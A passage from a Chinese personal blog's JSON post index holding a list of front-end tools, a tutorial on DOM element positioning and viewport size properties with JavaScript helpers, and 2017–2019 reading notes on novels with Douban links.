左右，使用与配置相当简单，Twitter，WebClipper中的Microsoft以及AtlasKit等大企业都在使用</code></pre><h3 id=\"apollo-client\">Apollo Client</h3>\n<pre><code>是一款全功能的GraphQL客户端，用于 React 、Angular 的交互。压缩的大小还不到25K。</code></pre><h3 id=\"jarvis\">Jarvis</h3>\n<pre><code>一款基于Webpack仪表板的智能浏览器，它可以给你显示你在webpack构建所需的所有重要信息。它向你展示了你的资源在12种不同的连接类型中的表现如何，你项目中所有包的大小，并拥有一个漂亮的错误输出。它仍处于beta版本，预计会增加许多新功能。</code></pre><h3 id=\"wikijs\">Wiki.js</h3>\n<pre><code>是一个强大的Wiki App，基于Node.js、Git和Markdown开发。你可以使用内置编辑器用Markdown格式来写作，并且可以自动同步到你的Git仓库。Wiki.js 有完整的访问控制和配置管理，但只占用很少的CPU资源。</code></pre>","index":35},{"filePath":"post\\Comprehensive\\visible-area.md","htmlPath":"/post/Comprehensive/visible-area.html","name":"visible-area.md","type":"md","title":"HTML元素定位","date":"2018/7/12","categories":"Collection","tags":"日常记录","html":"<p> getBoundingClientRect() 获取它相对于视图窗口的坐标</p>\n<h2 id=\"html元素精准定位\">HTML元素精准定位</h2>\n<p><code>event.clientX</code> 相对文档的水平座标 </p>\n<p><code>event.clientY</code> 相对文档的垂直座标 </p>\n<p><code>event.offsetX</code> 相对容器的水平坐标 </p>\n<p><code>event.offsetY</code> 相对容器的垂直坐标 </p>\n<p>网页正文项目组上： <code>window.screenTop</code>;</p>\n<p>网页正文项目组左： <code>window.screenLeft</code>;</p>\n<p>{% asset_img element-position.gif %}\n{% asset_img pic2.jpg %}</p>\n<p>clientTop/clientLeft  这个属性就是border宽度。</p>\n<p>offset包括border,client不包括border</p>\n<p>document.documentElement / body要做兼容</p>\n<h2 id=\"如何获取元素相对于整个网页的精确位置\">如何获取元素相对于整个网页的精确位置</h2>\n<p><strong>el.offsetLeft + el.clientLeft - el.scrollLeft</strong></p>\n<pre><code class=\"language-js\">// Helper function to get an element&#39;s exact position\nfunction getPosition(el) {\n  var xPos = 0;\n  var yPos = 0;\n\n  while (el) {\n    if (el.tagName == &quot;BODY&quot;) {\n      // deal with browser quirks with body/window/document and page scroll\n      var xScroll = el.scrollLeft || document.documentElement.scrollLeft;\n      var yScroll = el.scrollTop || document.documentElement.scrollTop;\n\n      xPos += (el.offsetLeft - xScroll + el.clientLeft);\n      yPos += (el.offsetTop - yScroll + el.clientTop);\n    } else {\n      // for all other non-BODY elements\n      xPos += (el.offsetLeft - el.scrollLeft + el.clientLeft);\n      yPos += (el.offsetTop - el.scrollTop + el.clientTop);\n    }\n\n    el = el.offsetParent;\n  }\n  return {\n    x: xPos,\n    y: yPos\n  };\n}</code></pre>\n<h2 id=\"判断元素是否在某个容器里的可视区域\">判断元素是否在某个容器里的可视区域</h2>\n<p><strong>el.offsetLeft + el.clientLeft</strong></p>\n<pre><code class=\"language-js\">/**\n * el 查询元素\n * scrollParent el最近的可滚动祖先节点\n * offset 预留的预加载距离\n*/\nconst checkInView=(el,scrollParent,offset)=&gt;{\n    let scrollTop,clientH,clientW,scrollLeft;\n    let offsetTop=0,offsetLeft=0;\n    if(scrollParent === window) {\n        scrollTop=document.documentElement.scrollTop||document.body.scrollTop;\n        scrollLeft=document.documentElement.scrollLeft||document.body.scrollLeft;\n        clientH=document.documentElement.clientHeight||document.body.clientHeight;\n        clientW=document.documentElement.clientWidth||document.body.clientWidth;\n    }\n    else {\n        scrollTop = scrollParent.scrollTop;\n        scrollLeft=scrollParent.scrollLeft;\n        clientH = scrollParent.clientHeight;\n        clientW=scrollParent.clientWidth;\n    }\n    while(el!=scrollParent &amp;&amp; el!=null){\n        offsetTop+=el.offsetTop+el.clientTop;\n        offsetLeft+=el.offsetLeft+el.clientLeft;\n        el=el.offsetParent;\n    }\n    if(scrollTop+clientH&gt;offsetTop-offset &amp;&amp; scrollLeft+clientW&gt;offsetLeft-offset){\n        return true;\n    }\n    else return false;\n}</code></pre>\n<h2 id=\"screen对象\">screen对象</h2>\n<p>用于获取用户的屏幕信息。</p>\n<ul>\n<li><p><code>screen.availWidth</code> 属性返回访问者屏幕的宽度，以像素计，减去界面特性，比如任务栏。</p>\n</li>\n<li><p><code>screen.availHeight</code> 属性返回访问者屏幕的高度，以像素计，减去界面特性，比如任务栏。</p>\n</li>\n</ul>\n<p>屏幕辨别率的高： <code>window.screen.height</code>;</p>\n<p>屏幕辨别率的宽： <code>window.screen.width</code>;</p>\n<h2 id=\"浏览器窗口可视区域大小clientheight\">浏览器窗口可视区域大小clientHeight</h2>\n<p>获得浏览器窗口的尺寸（浏览器的视口，不包括工具栏和滚动条）的方法:</p>\n<h4 id=\"一、对于ie9、chrome、firefox、opera-以及-safari：\">一、对于IE9+、Chrome、Firefox、Opera 以及 Safari：</h4>\n<ul>\n<li><code>window.innerHeight</code> - 浏览器窗口的内部高度</li>\n<li><code>window.innerWidth</code>- 浏览器窗口的内部宽度</li>\n</ul>\n<h4 id=\"二、对于-internet-explorer-8、7、6、5：\">二、对于 Internet Explorer 8、7、6、5：</h4>\n<ul>\n<li><code>document.documentElement.clientHeight</code>表示HTML文档所在窗口的当前高度。</li>\n<li><code>document.documentElement.clientWidth</code>表示HTML文档所在窗口的当前宽度。</li>\n</ul>\n<p>或者</p>\n<p>Document对象的body属性对应HTML文档的<code>&lt;body&gt;</code>标签</p>\n<ul>\n<li><code>document.body.clientHeight</code></li>\n<li><code>document.body.clientWidth</code></li>\n</ul>\n<h4 id=\"三、浏览器兼容性\">三、浏览器兼容性</h4>\n<pre><code class=\"language-javascript\">//屏幕可视窗口大小\nvar w= window.innerWidth||document.documentElement.clientWidth|| document.body.clientWidth;\nvar h=window.innerHeight|| document.documentElement.clientHeight || document.body.clientHeight;\n\n//滚动条滚动的距离\nwindow.pagYoffset || document.documentElement.scrollTop||document.body.scrollTop \n</code></pre>\n<h2 id=\"网页尺寸scrollheight\">网页尺寸scrollHeight</h2>\n<p><code>scrollHeight</code>和<code>scrollWidth</code>，获取网页内容高度和宽度。</p>\n<h4 id=\"一、针对ie、opera\">一、针对IE、Opera:</h4>\n<p>scrollHeight 是网页内容实际高度，可以小于 clientHeight。</p>\n<h4 id=\"二、针对ns、ff\">二、针对NS、FF:</h4>\n<p>scrollHeight 是网页内容高度，不过最小值是 clientHeight。也就是说网页内容实际高度小于 clientHeight 时，scrollHeight 返回 clientHeight 。</p>\n<h4 id=\"三、浏览器兼容性-1\">三、浏览器兼容性</h4>\n<pre><code class=\"language-javascript\">var w=document.documentElement.scrollWidth|| document.body.scrollWidth;\nvar h=document.documentElement.scrollHeight|| document.body.scrollHeight;</code></pre>\n<p><code>scrollHeight</code>和<code>scrollWidth</code>还可获取Dom元素中内容实际占用的高度和宽度。</p>\n<h2 id=\"网页尺寸offsetheight\">网页尺寸offsetHeight</h2>\n<p><code>offsetHeight</code>和<code>offsetWidth</code>，获取网页内容高度和宽度(包括滚动条等边线，会随窗口的显示大小改变)。</p>\n<h4 id=\"一、值\">一、值</h4>\n<p><code>offsetHeight = clientHeight + 滚动条 + 边框。</code></p>\n<h4 id=\"二、浏览器兼容性\">二、浏览器兼容性</h4>\n<pre><code class=\"language-javascript\">var w= document.documentElement.offsetWidth || document.body.offsetWidth;\nvar h= document.documentElement.offsetHeight|| document.body.offsetHeight;</code></pre>\n<h2 id=\"网页卷去的距离与偏移量\">网页卷去的距离与偏移量</h2>\n<p>我们先来看看下面的图：</p>\n<p>{% asset_img scroll.png %}</p>\n<p><code>scrollLeft</code>:设置或获取位于给定对象左边界与窗口中目前可见内容的最左端之间的距离 ，即左边灰色的内容。</p>\n<p><code>scrollTop</code>:设置或获取位于对象最顶端与窗口中可见内容的最顶端之间的距离,即网页被卷去的高，即上边灰色的内容。向上滚动的距离</p>\n<p><code>offsetLeft</code>:获取指定对象相对于版面或由 offsetParent 属性指定的父坐标的计算左侧位置 。</p>\n<p><code>offsetTop</code>:获取指定对象相对于版面或由 offsetParent 属性指定的父坐标的计算顶端位置 。</p>\n<p>注意:</p>\n<ol>\n<li>区分大小写</li>\n<li>offsetParent：布局中设置postion属性(Relative、Absolute、fixed)的父容器，从最近的父节点开始，一层层向上找，直到HTML的body。</li>\n</ol>\n","index":36},{"filePath":"post\\life\\2017.md","htmlPath":"/post/life/2017.html","name":"2017.md","type":"md","layout":"post","title":"2017读书","date":"2017/11/29","categories":"Reading","tags":"读书笔记","html":"<h3 id=\"《穆斯林的葬礼》\">《穆斯林的葬礼》</h3>\n<p><a href=\"https://book.douban.com/review/9724464/\">https://book.douban.com/review/9724464/</a></p>\n<h3 id=\"《月亮与六便士》\">《月亮与六便士》</h3>\n<p><a href=\"https://book.douban.com/review/9724462/\">https://book.douban.com/review/9724462/</a></p>\n<p>今年开始养阅读的习惯，继续努力。</p>\n","index":37},{"filePath":"post\\life\\2018.md","htmlPath":"/post/life/2018.html","name":"2018.md","type":"md","layout":"post","title":"2018读书","date":"2018/1/1","categories":"Reading","tags":"读书笔记","html":"<h3 id=\"《人类简史--从动物到上帝》\">《人类简史 : 从动物到上帝》</h3>\n<p><a href=\"https://book.douban.com/review/9724484/\">https://book.douban.com/review/9724484/</a></p>\n<h3 id=\"《为奴十二年》\">《为奴十二年》</h3>\n<p>内容对现在有点过时，全文里面讲的是他多惨多惨，当然里面也有同为奴隶的同僚之间的友谊美好，但现在看来对我来说没有多大触动。全篇抓住我的心只有最后<strong>瓦德尔</strong>如何救所罗门的情节</p>\n<h3 id=\"《一定爱读的极简欧洲史--为什么欧洲对现代文明的影响这么深》\">《一定爱读的极简欧洲史 : 为什么欧洲对现代文明的影响这么深》</h3>\n<p>比较浅显易懂地描述了欧洲历史\n<a href=\"https://book.douban.com/review/9727950/\">https://book.douban.com/review/9727950/</a></p>\n<h3 id=\"《步履不停》\">《步履不停》</h3>\n<p>故事很简单，可以说都是在回忆。但是作者对生活细节的描写虽然平常但是真实得让人泪目，让人有很强的代入感。可惜“父亲”已去世，\n来不及，早知道，意识到的时候人生已经翻过了几页了，想弥补也做不了什么了。后知后觉，唯有遗憾。只好尽可能地珍惜。“直到我真正搞清楚的时候，我的人生已经往后翻了好几页，再也无法回头挽救什么”</p>\n<h3 id=\"《我的天才女友--那不勒斯四部曲-01》\">《我的天才女友 : 那不勒斯四部曲-01》</h3>\n<p><a href=\"https://book.douban.com/review/9786970/\">https://book.douban.com/review/9786970/</a></p>\n<h3 id=\"《新名字的故事--那不勒斯四部曲-02》\">《新名字的故事 : 那不勒斯四部曲-02》</h3>\n<p><a href=\"https://book.douban.com/review/9790860/\">https://book.douban.com/review/9790860/</a></p>\n<h3 id=\"《离开的，留下的--那不四部曲-03》\">《离开的，留下的 : 那不四部曲-03》</h3>\n<p><a href=\"https://book.douban.com/review/9795883/\">https://book.douban.com/review/9795883/</a></p>\n<h3 id=\"《失踪的孩子--那不勒斯四部曲-04》\">《失踪的孩子 : 那不勒斯四部曲-04》</h3>\n<p><a href=\"https://book.douban.com/review/9805869/\">https://book.douban.com/review/9805869/</a></p>\n<h3 id=\"《现代艺术150年》\">《现代艺术150年》</h3>\n<p>没读完，看这本书就像在鉴赏名画一样，书上讲述了每幅画的来源、含义。其中有一句话诠释了普通人看不懂的艺术：\n“一名艺术家的工作不是去给人以美感上的愉悦，设计师可以做这事；艺术家的工作是从尘世中撤出一步，通过展示理念，使世界可以理喻或对世界进行评论”，好有道理。</p>\n<h3 id=\"《鱼王》\">《鱼王》</h3>\n<p>没读完。这是一本比较适合心静时候看的书，才能体会到西伯利亚那种雄壮的美</p>\n<h3 id=\"《1984》\">《1984》</h3>\n<p>没读完。有点枯燥，到处是夸张的比喻，不想看了。</p>\n<h3 id=\"《浮生六记》\">《浮生六记》</h3>\n<p>之前看汪涵推荐过，沈复先生和妻子的爱情故事。但是看了之后觉得沈复不是一个忠诚的丈夫啊，也会养小三，可能以前的社会男人三妻四妾也是正常的缘故。\n在书中字里行间，体会不到沈复对陈芸的深情，只是把她当作一个依靠</p>\n","index":38},{"filePath":"post\\life\\2019.md","htmlPath":"/post/life/2019.html","name":"2019.md","type":"md","layout":"post","title":"2019读书","date":"2019/1/1","categories":"Reading","tags":"读书笔记","html":"<h3 id=\"《房思琪的初恋乐园》\">《房思琪的初恋乐园》</h3>\n<p>为作者的遭遇感到愤怒、惋惜。一共有两条线：诱奸、家暴，反映出了社会很多问题1、侵害者或权或钱而脱干关系，被害者被误解甚至二次伤害2、家庭暴力3、家庭性教育等等。书中很多有趣的譬喻：</p>\n<blockquote>\n<p>怡婷听说了，心里直发寒。像是一只手伸进她的肚子，擦亮一支火柴，肚子内壁寥寥刻了几句诗。她不知道慈善是什么意思。查了辞典“慈善”：“仁慈善良，富同情心。梁简文帝，吴郡石像碑文：‘道由慈善，应起灵觉。’”怎么看，都跟妈妈们说的不一样</p>\n</blockquote>\n<blockquote>\n<p>功课只有她教别人，笔记给人抄，帮写毛笔字、做劳作，也不用别人跑合作社来换。她在这方面总是很达观。不是施舍的优越感，作业簿被传来传去，被不同的手复写，有的字迹圆滑如泡泡吹出来，有的疙瘩如吃到未熟的面条，作业簿转回自己手上，她总是幻想着作业簿生了许多面貌迥异的小孩。有人要房思琪的作业抄，思琪总是郑重推荐怡婷：“她的作业风流。”两人相视而笑，也不需要他人懂。</p>\n</blockquote>\n<blockquote>\n<p>我没有资格去譬喻别人的人生是什么形状</p>\n</blockquote>\n<blockquote>\n<p>心里的笑想滚水，不小心在脸上蒸发了</p>\n</blockquote>\n<blockquote>\n<p>两个人笑到泼出来，倾倒在对方身上。</p>\n</blockquote>\n<blockquote>\n<p>柏拉图说人求索他缺失的另一半，那就是说两个人合在一起才是完整，可是合起来就变成一个了，你们懂吗？像你们这样，无论缺少或多出什么都无所谓，因为有一个人与你镜像对称，只有永远合不起来，才可以永远做伴。</p>\n</blockquote>\n<h3 id=\"《南方高速--科塔萨尔短篇小说全集2》\">《南方高速 : 科塔萨尔短篇小说全集2》</h3>\n<p>最喜欢《秘密武器》\n<a href=\"https://book.douban.com/people/167927352/annotation/27079479/\">https://book.douban.com/people/167927352/annotation/27079479/</a></p>\n<h3 id=\"《许三观卖血记》\">《许三观卖血记》</h3>\n<p>大力推荐这本书！！这本小说太诙谐幽默了，没有一句废话。<a href=\"https://book.douban.com/review/9982247/\">https://book.douban.com/review/9982247/</a></p>\n<h3 id=\"《倾城之恋》\">《倾城之恋》</h3>\n<p>张爱玲的文章好像都是写爱情的，文字有点凄凉、有点无奈，富有香港被殖民的那种半中国半西式的腔调。<a href=\"https://book.douban.com/people/167927352/annotation/10757940/\">https://book.douban.com/people/167927352/annotation/10757940/</a></p>\n<h3 id=\"《巴黎圣母院》\">《巴黎圣母院》</h3>\n<p>这本书不只是一个故事，里面有大量的篇幅描写了巴黎建筑、各种市井。里面有完整的一卷全部在叙述巴黎圣母院，可见作者对于建筑艺术的热爱，也对建筑篡改的惋惜和愤怒，这可能才是这本书成为名著的关键。\n故事中最讨厌埃及女郎爱斯美拉达，我最看不惯这种为男人堕落的愚蠢女人，本来可以逃脱了又被抓回去。卡魔西多虽说是个粗鲁的人，却是用情最深的人，被抱走的女儿和被抱回的丑孩子，最终一起长眠。\n<a href=\"https://book.douban.com/people/167927352/annotation/2253413/\">https://book.douban.com/people/167927352/annotation/2253413/</a></p>\n<h3 id=\"《活着》\">《活着》</h3>\n<p><a href=\"https://book.douban.com/review/10067251/\">https://book.douban.com/review/10067251/</a>\n原来徐华的书是如此的好读，诙谐得很恰当，以乐衬悲。好喜欢徐华的风格</p>\n<h3 id=\"《精灵宝钻》\">《精灵宝钻》</h3>\n<p>语句未免有点平淡如水，好像另一个版本的圣经</p>\n<h3 id=\"《鱼王》\">《鱼王》</h3>\n<p>看得出作者是一个环保爱护环境的人，里面多处表现出冻土里人们打猎致使动物数量大减，环境遭受破坏的无奈和惋惜。作者也是个念旧的人，经常回去，回温小时候做过的事。</p>\n<h3 id=\"《人间失格》\">《人间失格》</h3>\n<p><a href=\"https://book.douban.com/people/167927352/annotation/24744505/\">https://book.douban.com/people/167927352/annotation/24744505/</a></p>\n<h3 id=\"《摆渡人》\">《摆渡人》</h3>\n<p>看了免费的样章，还挺好看的。讲的是小女孩死后在另一个世界的故事</p>\n<h3 id=\"《平凡的世界三部曲》\">《平凡的世界三部曲》</h3>\n<h3 id=\"《熊镇》\">《熊镇》</h3>\n<p>是我不会欣赏吗,感觉很无聊。故事情节比较简单，不能激起阅读兴趣</p>\n","index":39}]}